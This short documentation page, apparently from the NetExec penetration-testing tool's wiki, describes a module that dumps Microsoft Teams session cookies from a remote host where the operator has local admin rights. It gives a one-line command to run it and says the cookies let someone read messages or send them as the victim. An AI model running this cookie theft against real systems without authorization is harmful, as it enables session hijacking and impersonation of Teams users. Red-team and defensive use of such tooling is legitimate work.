# Steal Microsoft Teams Cookies

{% hint style="warning" %}
You need at least local admin privilege on the remote target
{% endhint %}

New NetExec module to dump Microsoft Teams cookies thanks to [@KuiilSec](https://twitter.com/KuiilSec)'s contribution.&#x20;

You can use them to retrieve information like users, messages, groups etc or send directly messages in Teams.

```bash
nxc smb $TARGET -u $USER -p $PASSWORD -M teams_localdb
```
